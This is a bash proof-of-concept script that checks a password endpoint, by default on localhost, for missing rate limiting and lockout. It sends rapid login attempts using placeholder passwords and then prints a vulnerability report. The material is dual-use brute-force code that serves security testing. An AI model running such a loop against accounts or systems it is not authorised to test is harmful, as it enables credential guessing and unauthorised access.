#!/bin/bash

# POC: Unrestricted Brute Force Attack on Password Field - No Rate Limiting
# This script demonstrates rapid password attempts without rate limiting, lockout, or throttling

TARGET_URL="${1:-http://localhost:8000}"
USERNAME="${2:-test}"
ATTEMPTS="${3:-20}"

echo "[*] Brute Force POC: Testing rate limiting on password field"
echo "[*] Target: $TARGET_URL/password/$USERNAME"
echo "[*] Attempts: $ATTEMPTS"
echo ""

# Common passwords to test
PASSWORDS=(
    "wrong1" "wrong2" "wrong3" "wrong4" "wrong5"
    "wrong6" "wrong7" "wrong8" "wrong9" "wrong10"
    "wrong11" "wrong12" "wrong13" "wrong14" "wrong15"
    "wrong16" "wrong17" "wrong18" "wrong19" "test"
)

# Track metrics
TOTAL_TIME=0
RESPONSE_COUNT=0
HTTP_200_COUNT=0
LOCKOUT_DETECTED=0
RATE_LIMIT_DETECTED=0

echo "[*] Starting rapid password attempts..."
echo ""

START_TIME=$(date +%s%N)

for i in $(seq 1 $ATTEMPTS); do
    PASSWORD="${PASSWORDS[$((i-1))]}"
    
    # Make the request and capture response
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
        "$TARGET_URL/password/$USERNAME" \
        -H "Content-Type: application/json" \
        -d "{\"password\": \"$PASSWORD\"}" \
        2>/dev/null)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    # Check for rate limiting headers
    HEADERS=$(curl -s -i -X POST \
        "$TARGET_URL/password/$USERNAME" \
        -H "Content-Type: application/json" \
        -d "{\"password\": \"$PASSWORD\"}" \
        2>/dev/null | head -20)
    
    if echo "$HEADERS" | grep -qi "x-ratelimit-remaining\|retry-after\|429\|503"; then
        RATE_LIMIT_DETECTED=$((RATE_LIMIT_DETECTED + 1))
    fi
    
    if echo "$BODY" | grep -qi "locked\|too many\|attempts\|wait\|throttle"; then
        LOCKOUT_DETECTED=$((LOCKOUT_DETECTED + 1))
    fi
    
    if [ "$HTTP_CODE" = "200" ]; then
        HTTP_200_COUNT=$((HTTP_200_COUNT + 1))
        if [ "$PASSWORD" = "test" ]; then
            echo "[+] ATTEMPT $i: Password CORRECT! HTTP $HTTP_CODE - Authentication bypass successful!"
        else
            echo "[!] ATTEMPT $i: HTTP $HTTP_CODE - No authentication required or weak validation"
        fi
    elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
        echo "[-] ATTEMPT $i: HTTP $HTTP_CODE - Authentication rejected (normal behavior)"
    else
        echo "[-] ATTEMPT $i: HTTP $HTTP_CODE"
    fi
    
    # Small delay between requests (still rapid)
    sleep 0.005
done

END_TIME=$(date +%s%N)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
ELAPSED_SEC=$(echo "scale=2; $ELAPSED_MS / 1000" | bc)

echo ""
echo "====== BRUTE FORCE TEST RESULTS ======"
echo "Total attempts: $ATTEMPTS"
echo "Time elapsed: ${ELAPSED_SEC}s"
if [ "$ELAPSED_SEC" != "0" ]; then
    RATE=$(echo "scale=1; $ATTEMPTS / $ELAPSED_SEC" | bc)
    echo "Request rate: ~${RATE} attempts/second"
fi
echo "HTTP 200 responses: $HTTP_200_COUNT"
echo "Rate limit headers detected: $RATE_LIMIT_DETECTED"
echo "Account lockout messages: $LOCKOUT_DETECTED"
echo ""

if [ "$HTTP_200_COUNT" -gt 0 ]; then
    echo "[VULNERABLE] Password attempts accepted without proper authentication!"
fi

if [ "$RATE_LIMIT_DETECTED" -eq 0 ]; then
    echo "[VULNERABLE] No rate limiting headers detected!"
fi

if [ "$LOCKOUT_DETECTED" -eq 0 ]; then
    echo "[VULNERABLE] No account lockout mechanism detected!"
fi

echo ""
echo "====== SECURITY ISSUES IDENTIFIED ======"
echo "1. No rate limiting enforced"
echo "2. No account lockout after multiple failures"
echo "3. No exponential backoff or throttling"
echo "4. Brute force attacks are feasible"
echo "5. Rapid password guessing is possible"

exit 0